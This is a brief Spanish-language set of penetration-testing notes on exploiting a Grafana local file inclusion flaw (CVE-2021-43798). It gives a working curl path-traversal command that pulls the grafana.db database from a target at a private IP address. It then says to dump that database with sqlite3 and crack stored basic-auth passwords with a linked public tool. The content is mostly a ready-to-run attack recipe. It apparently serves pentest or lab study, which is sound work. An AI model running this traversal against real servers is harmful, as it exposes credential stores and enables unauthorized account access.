Si encontramos una versión de grafana con LFI:

Podemos bajar la db del mismo

    curl --path-as-is http://192.168.247.181:3000/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../../../var/lib/grafana/grafana.db -O grafana.db


luego podemos dumpearla con sqlite3.

# Crack pass
Si encontramos un basicauthpassword podemos romperlo con

    https://github.com/jas502n/Grafana-CVE-2021-43798

si nos da un error por falta de librerías:

    go mod tidy
